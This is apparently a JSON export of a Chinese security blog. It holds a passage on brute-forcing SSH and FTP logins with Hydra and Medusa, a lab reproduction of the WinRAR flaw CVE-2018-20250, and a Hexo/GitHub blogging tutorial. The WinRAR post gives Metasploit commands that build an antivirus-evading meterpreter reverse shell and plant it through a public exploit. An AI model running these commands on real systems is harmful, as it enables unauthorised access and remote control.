详细级别（0-6详细）-w [NUM] 错误调试级别（0-10）-V 显示版本-Z [TEXT] 继续扫描上一次Example：medusa -M ssh -u root -P passwd.txt -h 192.168.126.130 -f -v 6 3.实验3.1暴力破解SSH3.1.1Hydra1hydra -l chessur -P passwd.txt ssh://192.168.126.130 3.1.2Medusa1medusa -M ssh -u chessur -P passwd.txt -h 192.168.126.130 -F -v 6 3.2暴力破解FTP3.2.1Hydra1hydra -l ftp1 -P passwd.txt ssh://192.168.126.130 3.2.2Medusa1medusa -M ftp -u ftp1 -P passwd.txt -h 192.168.126.130 -f -v 6 4.总结1.Medusa比Hydra稳定，但是破解速度比较慢。 2.SSH尝试速度比FTP尝试速度慢。 3.Medusa支持参数和服务类型比Hydra少，可能是很久不更新的原因。 5.参考[1] thc-hydra-README [2] Medusa Parallel Network Login Auditor","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'WinRAR目录穿越漏洞复现（CVE-2018-20250）'","slug":"Writeup-on-CVE-2018-20250","date":"2019-03-15T11:25:33.000Z","updated":"2019-03-24T07:50:57.816Z","comments":true,"path":"2019/03/15/Writeup-on-CVE-2018-20250/","link":"","permalink":"https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/","excerpt":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/","text":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/ 4.漏洞复现过程4.1使用Metasploit5生成免杀Payload123456789msfconsoleuse evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.2使用exp生成恶意程序12345cd /root/Desktopgit clone https://github.com/WyAtu/CVE-2018-20250.gitcd CVE-2018-20250cp /root/.msf4/local/WinRAR.exe ./vim exp.py 将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe” 将CVE-2018-20250文件夹复制到Windows10中，执行 1python exp.py 生成恶意程序test.rar 4.3在靶机上运行恶意程序将test.rar复制到Windows7上，解压运行 4.4在Kali Linux上执行Metasploit监听1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.5控制靶机Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。 5.总结刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。 6.参考文章[1] Extracting a 19 Year Old Code Execution from WinRAR [2] WinRAR目录穿越漏洞浅析及复现（CVE-2018-20250） [3] WinRAR远程代码执行漏洞结合Metasploit+Ngrok实现远程上线","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/tags/漏洞复现/"}]},{"title":"'Hexo+GitHub搭建Blog过程'","slug":"How-to-Creat-a-Blog-with-Hexo&GitHub","date":"2019-03-14T12:43:46.000Z","updated":"2019-03-24T07:50:32.197Z","comments":true,"path":"2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","link":"","permalink":"https://chirec.github.io/2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","excerpt":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。","text":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。 3.配置SSH key运行之前安装好的cmder，输入以下命令创建SSH密钥 1ssh-keygen -t rsa -C 邮件地址 执行命令后，点击三次Enter，会生成一个名为.ssh的文件夹在用户目录下，使用记事本打开文件夹中的id_rsa.pub文件，将文件内容复制，打开GitHub主页，点击右上方头像，再点击下拉菜单中的Setting，点击左侧菜单中的SSH and GPG keys，点击右边的绿色New SSH key按钮添加新的SSH kye 在Key中粘贴刚刚复制的内容，点击下方绿色Add SSH key按钮，即可完成配置SSH key。 回到cmder中，输入以下命令测试是否成功配置SSH key 1ssh -T git@github.com 提示Are you sure you want to continue connecting (yes/no)，输入yes，若看到 Hi username！You’ve successfully authenticated, but GitHub does not provide shell access. 则表示成功配置SSH key。 再输入以下命令进一步配置： 12git config --global user.name username //username即为用户名git config --global user.email email //email为创建GitHub时的邮箱 4.安装Hexo首先，在你的硬盘中创建一个存放你自己Blog文件的文件夹，如D:\\Blog，然后在cmder中输入以下代码： 1234567d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务hexo init //初始化hexo g //生成Blog文件hexo s //启动服务 执行hexo s后，可以在本地预览Blog，打开浏览器访问http://localhost:4000即可查看内容。 修改主题，首先打开cmder，然后输入以下命令，以hexo-theme-yilia为例： 12cd Bloggit clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 下载的主题会存在Blog文件夹下的themes文件下，将Blog文件夹下的_config.yml中的theme: landscape改为theme: yilia，然后执行hexo g重新生成。 5.上传到GitHub更改配置文件_config.yml中deploy选项： 1234deploy: type: git repository: git@github.com:username/username.github.io.git branch: master 更改完成之后，在cmder中输入： 1hexo d 即可将Blog上传到GitHub。 6.写博客打开cmder，跳转到Blog的根目录，执行命令： 1hexo new &apos;name&apos; 执行成功后，会显示生成的md文件的位置，打开这个文件即可开始编写Blog，我使用的是Typora进行编写。 7.在Hexo中插入图片首先，在_config.yml中，将post_asset_folder改为true，这样设置之后，当我们执行 1hexo new &apos;New Page&apos; 后，会创建一个和文章名相同的文件夹，将要插入的图片放进这个文件夹中，图片名称不要太长，太长似乎不会正确显示。 然后安装hexo插件 1npm install hexo-asset-image --save 做完这两步之后，我们在文章要插入图片的地方写入 1&#123;% asset_img 图片名 图片解释 %&#125; 即可插入图片 8.参考文章[1] 使用hexo+github搭建免费个人博客详细教程 [2] hexo博客图片问题 [3] 开始使用-NexT 使用文档","categories":[],"tags":[]}]}